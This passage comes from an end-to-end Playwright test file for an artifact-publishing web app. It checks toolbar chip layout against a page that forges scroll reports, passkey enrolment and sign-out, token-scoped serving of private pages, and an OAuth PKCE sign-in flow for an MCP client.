  assert.equal(await link.getAttribute('href'), `http://localhost:${PUBLIC_APP_PORT}/a/${shared.id}`)
  await viewer.goto(`http://localhost:${APP_PORT}/a/${hidden.id}`)
  await viewer.locator('#title').waitFor({ state: 'attached' })
  assert.equal(await viewer.locator('#public-link').isHidden(), true)
  await viewer.close()
})

test('the 公開 chip stays on screen and tappable when a page slides the phone bar away, and covers neither a bar control nor the page', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  // The page reports a scroll position it never had: any page can hide the bar, so visibility must not live in it.
  const forged = `<!doctype html><body><h1>短頁</h1><p id="sent"></p><script>
addEventListener('load', () => setTimeout(() => {
  parent.postMessage({ __artifact: 1, report: { type: 'place', path: location.pathname, hash: '', scrollY: 5000 } }, '*')
  document.getElementById('sent').textContent = 'sent'
}, 300))
</script></body>`
  const { id } = store.publish({ title: '藏起工具列', files: { 'index.html': { content: Buffer.from(forged) } } })
  store.setVisibility(id, 'public')
  const chip = (page: Page) => page.locator('#public-link').evaluate((el) => {
    const r = el.getBoundingClientRect()
    const hit = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2)
    const overlaps = [...document.querySelectorAll('.viewer-bar a, .viewer-bar button, .viewer-bar select')].filter((other) => {
      const o = other.getBoundingClientRect()
      return o.width > 0 && o.height > 0 && o.left < r.right && r.left < o.right && o.top < r.bottom && r.top < o.bottom
    }).map((other) => other.id || other.className)
    // On phones the bar slides away and the frame grows to the top: the chip must not sit over the page then.
    const f = document.getElementById('frame')!.getBoundingClientRect()
    return {
      coversFrame: f.left < r.right && r.left < f.right && f.top < r.bottom && r.top < f.bottom,
      inBar: Boolean(el.closest('.viewer-bar')),
      inside: r.width > 0 && r.top >= 0 && r.left >= 0 && r.bottom <= innerHeight && r.right <= innerWidth,
      hit: Boolean(hit && el.contains(hit)),
      overlaps,
      barAway: document.body.classList.contains('bar-away')
    }
  })
  const viewer = await browser.newPage()
  try {
    await viewer.setViewportSize({ width: 390, height: 760 })
    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
    await viewer.locator('#public-link:not([hidden])').waitFor({ timeout: 5000 })
    const shown = await chip(viewer)
    assert.deepEqual(shown, { coversFrame: false, inBar: false, inside: true, hit: true, overlaps: [], barAway: false }, `bar showing: ${JSON.stringify(shown)}`)
    // The frame's height and top margin follow the sliding bar: one `transition` must name both, or the later rule drops one.
    const slides = await viewer.locator('.viewer').evaluate((el) => getComputedStyle(el).transitionProperty.split(/,\s*/).sort())
    assert.deepEqual(slides, ['height', 'margin-top'], `.viewer transition-property: ${slides}`)
    await viewer.frameLocator('#frame').locator('#sent', { hasText: 'sent' }).waitFor({ timeout: 5000 })
    await viewer.waitForFunction(() => document.body.classList.contains('bar-away'), null, { timeout: 3000 })
    await viewer.waitForTimeout(400) // the 0.2 s slide
    const away = await chip(viewer)
    assert.deepEqual({ ...away, overlaps: [] }, { coversFrame: false, inBar: false, inside: true, hit: true, overlaps: [], barAway: true }, `bar away: ${JSON.stringify(away)}`)
    assert.equal(await viewer.locator('#public-link').getAttribute('href'), `http://localhost:${PUBLIC_APP_PORT}/a/${id}`)

    await viewer.setViewportSize({ width: 1280, height: 800 })
    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
    await viewer.frameLocator('#frame').locator('#sent', { hasText: 'sent' }).waitFor({ timeout: 5000 })
    await viewer.waitForTimeout(300)
    const desk = await chip(viewer)
    assert.deepEqual(desk, { coversFrame: false, inBar: false, inside: true, hit: true, overlaps: [], barAway: false }, `desktop: ${JSON.stringify(desk)}`)
  } finally {
    await viewer.close()
  }
})

// The owner on the public app: a passkey (Chromium's virtual authenticator), a session, and private pages
// served by the public content listener under a content token.

const PUBLIC_APP = `http://localhost:${PUBLIC_APP_PORT}`
const PUBLIC_CONTENT = `http://127.0.0.1:${PUBLIC_CONTENT_PORT}`
const ONE_PIXEL = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64')

async function withAuthenticator(page: import('playwright-core').Page) {
  const cdp = await page.context().newCDPSession(page)
  await cdp.send('WebAuthn.enable')
  await cdp.send('WebAuthn.addVirtualAuthenticator', {
    options: { protocol: 'ctap2', transport: 'internal', hasResidentKey: true, hasUserVerification: true, isUserVerified: true, automaticPresenceSimulation: true }
  })
}

async function enrolOwner(page: import('playwright-core').Page) {
  await withAuthenticator(page)
  const link = await fetch(`http://localhost:${APP_PORT}/api/login-links`, { method: 'POST', headers: { authorization: `Bearer ${TOKEN}` } }).then((r) => r.json()) as { url: string }
  assert.ok(link.url.startsWith(`${PUBLIC_APP}/enroll#`))
  await page.goto(link.url)
  await page.locator('#name').fill('測試裝置')
  await page.locator('#go').click()
  await page.waitForURL(`${PUBLIC_APP}/`, { timeout: 10_000 })
  return link.url.split('#')[1]
}

test('the owner enrols a passkey from a one-time link, signs out, and signs in again with it', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const context = await browser.newContext()
  const page = await context.newPage()
  const code = await enrolOwner(page)
  // Signed in: the gallery of every artifact, with the account link.
  await page.locator('a[href="/account"]').waitFor({ timeout: 5000 })
  const cookie = (await context.cookies()).find((c) => c.name === '__Host-artifacts_session')!
  assert.ok(cookie.httpOnly && cookie.secure && cookie.sameSite === 'Lax' && cookie.path === '/' && !cookie.domain.startsWith('.'))

  // The link is spent, and without it (or a session) nobody can start enrolling.
  for (const tried of [code, 'x']) {
    const again = await fetch(`${PUBLIC_APP}/auth/register/options`, { method: 'POST', headers: { 'x-artifact-client': 'viewer', 'content-type': 'application/json' }, body: JSON.stringify({ code: tried }) })
    assert.equal(again.status, 403)
  }

  await page.goto(`${PUBLIC_APP}/account`)
  await page.locator('#passkeys li', { hasText: '測試裝置' }).waitFor({ timeout: 5000 })
  await page.locator('#logout').click()
  await page.waitForURL(`${PUBLIC_APP}/login`)
  assert.equal((await page.goto(`${PUBLIC_APP}/`))!.status(), 404)

  await page.goto(`${PUBLIC_APP}/login?next=/account`)
  await page.locator('#go').click()
  await page.waitForURL(`${PUBLIC_APP}/account`, { timeout: 10_000 })
  await page.locator('#passkeys li', { hasText: '測試裝置' }).waitFor({ timeout: 5000 })
  await context.close()
})

test('signed in, the owner reads a private page on the public origins under a content token: relative links, CSS, Office pictures, lazy images, comments', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const pptx = new PptxGenJS()
  pptx.addSlide().addImage({ data: `image/png;base64,${ONE_PIXEL.toString('base64')}`, x: 1, y: 1, w: 2, h: 2 })
  const deck = (await pptx.write({ outputType: 'nodebuffer' })) as Buffer
  const html = `<!doctype html><html><head><link rel="stylesheet" href="style.css"></head><body>
<h1 id="t">私人頁</h1><div id="bg"></div>
<a id="next" href="sub/two.html">下一頁</a>
<div style="height:3000px"></div><img id="lazy" src="pic.png" loading="lazy" width="10" height="10">
<img id="missing" src="missing.png">
</body></html>`
  const { id } = store.publish({
    title: '私人頁',
    entry: 'docs/index.html',
    files: {
      'docs/index.html': { content: Buffer.from(html) },
      'docs/style.css': { content: Buffer.from('#bg { width: 10px; height: 10px; background-image: url(pic.png) }') },
      'docs/pic.png': { content: ONE_PIXEL },
      'docs/sub/two.html': { content: Buffer.from('<!doctype html><h1 id="two">第二頁</h1>') },
      'deck.pptx': { content: deck }
    }
  })
  const other = store.publish({ title: '另一份', files: { 'index.html': { content: Buffer.from('<p>secret</p>') } } })
  const context = await browser.newContext()
  const page = await context.newPage()
  await enrolOwner(page)

  // Anonymous visitors still see nothing: same page as an id that does not exist.
  const anonymous = await browser.newContext()
  const stranger = await anonymous.newPage()
  const missing = await stranger.request.get(`${PUBLIC_APP}/a/${id}`)
  const nothing = await stranger.request.get(`${PUBLIC_APP}/a/no-such-id`)
  assert.equal(missing.status(), 404)
  assert.equal((await missing.text()).replace(id, 'ID'), (await nothing.text()).replace('no-such-id', 'ID'))
  assert.equal((await stranger.request.get(`${PUBLIC_CONTENT}/a/${id}/v/1/docs/index.html`)).status(), 404)
  await anonymous.close()

  await page.goto(`${PUBLIC_APP}/a/${id}`)
  const frame = page.frameLocator('#frame')
  await frame.locator('#t').waitFor({ timeout: 5000 })
  const pageFrame = () => page.frames().find((f) => f.url().startsWith(`${PUBLIC_CONTENT}/t/`))!
  // The nested entry's redirect kept the token; the page is still sandboxed.
  assert.match(pageFrame().url(), new RegExp(`^${PUBLIC_CONTENT}/t/[^/]+/a/${id}/v/1/docs/index.html$`))
  assert.equal(await pageFrame().evaluate(() => origin), 'null')
  // CSS and its url() load under the token.
  await pageFrame().waitForFunction(() => getComputedStyle(document.getElementById('bg')!).backgroundImage.includes('/t/'))
  // A lazy image far down loads once scrolled to.
  await frame.locator('#lazy').scrollIntoViewIfNeeded()
  await pageFrame().waitForFunction(() => (document.getElementById('lazy') as HTMLImageElement).naturalWidth > 0, undefined, { timeout: 5000 })
  // The missing picture is logged without the token.
  await page.waitForFunction(() => !(document.getElementById('errors') as HTMLElement).hidden, undefined, { timeout: 5000 })
  const logged = JSON.stringify(store.listErrors(id, 1))
  assert.match(logged, /missing\.png/)
  assert.doesNotMatch(logged, /\/t\//)
  // Relative links navigate inside the frame, and the address bar names the file.
  await frame.locator('#next').click()
  await frame.locator('#two').waitFor({ timeout: 5000 })
  await page.waitForURL(/path=docs%2Fsub%2Ftwo\.html/)

  // Comments work for the signed-in owner.
  await page.locator('#toggle-comments').click()
  page.once('dialog', (dialog) => dialog.accept('擁有者'))
  await page.locator('#comment-body').fill('外網留言')
  await page.locator('#comment-form button[type="submit"]').click()
  await page.locator('#threads', { hasText: '外網留言' }).waitFor({ timeout: 5000 })

  // This artifact's token does not open another artifact.
  const token = /\/t\/([^/]+)\//.exec(pageFrame().url())![1]
  assert.equal((await page.request.get(`${PUBLIC_CONTENT}/t/${token}/a/${other.id}/v/1/`)).status(), 404)
  assert.equal((await page.request.get(`${PUBLIC_CONTENT}/t/${token}x/a/${id}/v/1/docs/pic.png`)).status(), 404)
  // No referrer leaves with the token.
  assert.equal((await page.request.get(`${PUBLIC_CONTENT}/t/${token}/a/${id}/v/1/docs/pic.png`)).headers()['referrer-policy'], 'no-referrer')

  // A renewed token is a path the viewer's frame-src allows.
  const renewed = await page.evaluate(async (artifactId) => (await fetch(`/api/artifacts/${artifactId}/content-token`)).json(), id)
  assert.match(renewed.contentBase, new RegExp(`^${PUBLIC_CONTENT}/t/`))

  // The PowerPoint file's pictures come from inside the file, under the token.
  const deckFrame = await page.goto(`${PUBLIC_APP}/a/${id}?path=deck.pptx`)
  assert.equal(deckFrame!.status(), 200)
  await frame.locator('.slide.active img').waitFor({ timeout: 5000 })
  await frame.locator('.slide.active img').evaluate((img: HTMLImageElement) => (img.complete ? null : new Promise((done) => img.addEventListener('load', done, { once: true }))))
  assert.ok((await frame.locator('.slide.active img').evaluate((img: HTMLImageElement) => img.naturalWidth)) > 0)
  assert.match(await frame.locator('.slide.active img').evaluate((img: HTMLImageElement) => img.currentSrc), /\/t\/[^/]+\/a\/.*~office/)

  // The token page opened top-level goes back into the viewer, without the token in the address.
  const top = await context.newPage()
  await top.goto(pageFrame().url())
  await top.waitForURL(new RegExp(`^${PUBLIC_APP}/a/${id}\\?`))
  await top.close()
  await context.close()
})

test('an MCP client signs in through the browser: passkey sign-in, consent page, back to its loopback with code, state and iss', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const context = await browser.newContext()
  const page = await context.newPage()
  await enrolOwner(page)
  await page.evaluate(() => fetch('/auth/logout', { method: 'POST', headers: { 'x-artifact-client': 'viewer' } }))

  const callback = `http://127.0.0.1:${SINK_PORT}/callback`
  const registered = (await (await fetch(`${PUBLIC_APP}/oauth/register`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ client_name: 'E2E 客戶端', redirect_uris: [callback] }) })).json()) as { client_id: string }
  const verifier = 'v'.repeat(64)
  const challenge = (await import('node:crypto')).createHash('sha256').update(verifier).digest('base64url')
  // Long states happen (some clients pack JSON in them); the round trip through sign-in must keep it.
  const state = 's'.repeat(1500)
  const query = new URLSearchParams({ response_type: 'code', client_id: registered.client_id, redirect_uri: callback, code_challenge: challenge, code_challenge_method: 'S256', state, resource: `${PUBLIC_APP}/mcp`, scope: 'artifacts' })
  await page.route(`${callback}**`, (route) => route.fulfill({ body: 'back in the client' }))

  await page.goto(`${PUBLIC_APP}/oauth/authorize?${query}`)
  await page.waitForURL(/\/login\?next=/)
  await page.locator('#go').click()
  await page.locator('h1', { hasText: 'E2E 客戶端' }).waitFor({ timeout: 10_000 })
  assert.match(await page.locator('.auth-card').textContent() ?? '', new RegExp(`127\\.0\\.0\\.1:${SINK_PORT}`))
  await page.locator('#allow').click()
  await page.waitForURL((url) => url.href.startsWith(callback), { timeout: 10_000 })
  const back = new URL(page.url())
  assert.equal(back.searchParams.get('state'), state)
  assert.equal(back.searchParams.get('iss'), PUBLIC_APP)
  const tokens = await fetch(`${PUBLIC_APP}/oauth/token`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ grant_type: 'authorization_code', code: back.searchParams.get('code')!, redirect_uri: callback, client_id: registered.client_id, code_verifier: verifier }).toString()
  })
  assert.equal(tokens.status, 200)
  await context.close()
})
